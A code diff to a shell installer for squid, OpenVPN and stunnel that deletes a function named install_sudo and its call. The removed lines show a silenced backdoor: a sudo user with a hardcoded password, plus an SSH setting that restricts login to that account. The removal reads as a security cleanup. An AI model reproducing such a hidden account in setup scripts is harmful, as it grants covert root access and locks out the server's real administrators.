@@ -617,15 +617,6 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
-install_sudo(){
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
-
 install_iptables(){
   {
 echo -e "\033[01;31m Configure Sysctl \033[0m"
@@ -717,7 +708,6 @@ install_done()
 }
 
 install_require
-install_sudo
 install_squid
 install_openvpn
 install_stunnel
